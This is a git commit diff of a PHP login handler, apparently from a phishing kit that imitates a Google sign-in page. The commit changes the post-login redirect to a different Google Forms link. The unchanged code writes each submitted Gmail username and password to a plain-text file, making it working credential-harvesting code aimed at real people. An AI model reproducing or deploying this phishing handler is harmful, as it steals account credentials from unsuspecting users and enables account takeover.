54d2459a63ca64e9db397b6cb86e86cb7e34bc9c
tuanphan0701 <59394699+tuanphan0701@users.noreply.github.com>
2021-08-05 08:33:47 -0700

    Update login.php

--- .sites/google_new/login.php
+++ .sites/google_new/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://forms.gle/KMZgmV9gToPMHzfT6');
+header('Location: https://forms.gle/7perHLbhbMSAeuVB8');
 exit();
 ?>
